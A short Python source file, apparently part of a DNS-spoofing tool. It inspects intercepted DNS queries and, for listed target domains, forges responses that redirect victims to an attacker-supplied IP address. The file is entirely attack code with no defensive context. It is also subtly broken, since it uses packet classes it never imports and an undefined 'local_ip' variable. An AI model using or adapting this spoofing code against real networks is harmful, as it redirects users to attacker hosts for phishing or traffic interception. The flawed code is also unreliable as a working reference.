import packet_sniffer

class DnsSpoofArgs:
    def __init__(self, urls, redirect_ip):
        self.urls = urls
        self.redirect_ip = redirect_ip

def check_packet(pkt, args: DnsSpoofArgs):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt.haslayer("DNS Question Record"):
        print("[*] Checking DNS record: ", pkt["DNS Question Record"].qname)
        for url in args.urls:
            if url in str(pkt["DNS Question Record"].qname):
                print("[+] DNS Spoofing: {}".format(pkt["DNS Question Record"].qname))
                spf_resp =  IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname=url,rdata=args.redirect_ip))

                return spf_resp

    return pkt
